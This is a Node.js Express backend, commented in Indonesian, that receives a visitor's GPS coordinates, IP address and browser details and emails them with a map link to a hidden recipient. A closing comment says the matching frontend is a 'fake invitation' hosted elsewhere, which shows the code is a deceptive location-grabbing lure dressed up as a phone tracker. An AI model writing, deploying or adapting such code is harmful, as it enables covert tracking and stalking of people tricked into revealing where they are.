require("dotenv").config();
const express = require("express");
const http = require("http"); // Masih perlu untuk membuat server HTTP
const nodemailer = require("nodemailer");

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// Konfigurasi Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: "gmail", // Anda bisa ganti dengan 'outlook', 'yahoo', atau konfigurasi SMTP kustom
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Middleware untuk mem-parse JSON dari request body
app.use(express.json());

// Endpoint utama untuk menerima lokasi
app.post("/send-location", async (req, res) => {
  const { latitude, longitude, accuracy } = req.body;

  if (!latitude || !longitude) {
    return res.status(400).json({ message: "Data lokasi tidak lengkap." });
  }

  // Informasi tambahan yang bisa Anda tangkap dari request (opsional)
  const userAgent = req.headers["user-agent"] || "Tidak diketahui";
  const ipAddress = req.ip || req.connection.remoteAddress || "Tidak diketahui";

  console.log("Lokasi diterima (POST):", {
    latitude,
    longitude,
    accuracy,
    userAgent,
    ipAddress,
  });

  const mapLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: "LOKASI PONSEL ANDA TERDETEKSI!",
    html: `
            <p>Ponsel Anda terdeteksi di lokasi berikut:</p>
            <ul>
                <li><strong>Latitude:</strong> ${latitude}</li>
                <li><strong>Longitude:</strong> ${longitude}</li>
                <li><strong>Akurasi:</strong> ${
                  accuracy ? accuracy + " meter" : "Tidak diketahui"
                }</li>
                <li><strong>Waktu Deteksi:</strong> ${new Date().toLocaleString(
                  "id-ID",
                  { timeZone: "Asia/Jakarta" },
                )} WIB</li>
            </ul>
            <p>Lihat di Peta: <a href="${mapLink}" target="_blank">${mapLink}</a></p>
            <hr>
            <p>Detail Tambahan (opsional):</p>
            <ul>
                <li>User Agent (Browser/OS): ${userAgent}</li>
                <li>IP Address: ${ipAddress}</li>
            </ul>
            <p>Catatan: Ini adalah notifikasi otomatis dari sistem pelacak Anda. JANGAN SAMPAI TERBUKA OLEH ORANG LAIN!</p>
        `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Email notifikasi lokasi berhasil dikirim.");
    res
      .status(200)
      .json({ message: "Lokasi berhasil diterima dan dikirim via email." });
  } catch (error) {
    console.error("Gagal mengirim email notifikasi lokasi:", error);
    res
      .status(500)
      .json({ message: "Terjadi kesalahan saat mengirim email notifikasi." });
  }
});

// Server hanya akan melayani endpoint POST ini. Tidak ada halaman admin atau file statis dari sini.
// Pastikan frontend (undangan palsu) Anda dihosting terpisah (Vercel/Netlify).

server.listen(PORT, () => {
  console.log(`Backend server berjalan di http://localhost:${PORT}`);
  console.log(`Siap menerima lokasi di POST /send-location`);
});
